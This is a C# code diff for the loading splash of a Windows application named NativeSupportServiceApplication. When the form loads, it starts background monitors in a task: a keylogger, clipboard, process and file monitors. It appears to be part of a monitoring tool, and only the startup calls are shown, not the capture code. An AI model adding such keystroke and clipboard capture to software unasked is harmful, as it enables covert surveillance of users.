@@ -10,6 +10,8 @@ namespace NativeSupportServiceApplication
 {
     public partial class LoadingSplash : Form
     {
+
+        Task loading;
         public LoadingSplash()
         {
             InitializeComponent();
@@ -18,9 +20,12 @@ namespace NativeSupportServiceApplication
 
         }
 
-        private void startServices()
+        private static void startServices()
         {
-            GlobalConstants.taskKeyMonitor = Task.Run(() => InterceptKeys.startMonitor());
+
+            Cache.rebuildRuleCache();
+            //  GlobalConstants.taskKeyMonitor = Task.Run(() => InterceptKeys.startMonitor());
+            GlobalConstants.taskKeyMonitor = Task.Run(() => KeyLogger.startMonitor());
             GlobalConstants.taskClipboardMonitor = Task.Run(() => ClipboardMonitor.startMonitor());
             GlobalConstants.taskProcessMonitor = Task.Run(() => ProcessMonitor.startMonitor());
             GlobalConstants.taskFileMonitor = Task.Run(() => FileMonitor.startMonitor());
@@ -29,10 +34,7 @@ namespace NativeSupportServiceApplication
 
         }
 
-        private void buildCache()
-        {
-           
-        }
+      
 
         private void button1_Click(object sender, EventArgs e)
         {
@@ -43,9 +45,13 @@ namespace NativeSupportServiceApplication
 
         private void LoadingSplash_Load(object sender, EventArgs e)
         {
-            Cache.rebuildRuleCache();
 
-            startServices();
+
+
+
+            loading = Task.Run(() => {
+                startServices();
+            });
 
             currentForm = this;
             Debug.WriteLine("staring work");
@@ -53,14 +59,16 @@ namespace NativeSupportServiceApplication
             backgroundWorker1.RunWorkerAsync();
 
 
+
+
         }
         private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
         {
             Debug.WriteLine("sleeping");
-            Thread.Sleep(5000);
+           // Thread.Sleep(5000);
             Debug.WriteLine("awake");
             Debug.WriteLine("closing form");
-         
+            loading.Wait();
             //backgroundWorker1.ReportProgress(0,"done");
         }
         private void backgroundWorker1_ProgressChanged(object sender, ProgressChangedEventArgs e) 
